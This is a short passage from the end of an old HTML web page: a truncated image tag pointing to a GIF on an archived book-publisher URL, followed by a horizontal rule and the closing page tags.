SRC="nc.gif" tppabs="http://www.mcp.com/818726400/0-672/0-672-30891-6/nc.gif" BORDER=0 HEIGHT=88 WIDTH=140></A></P></CENTER>

<P>
<HR WIDTH="100%"></P>

</BODY>
</HTML>
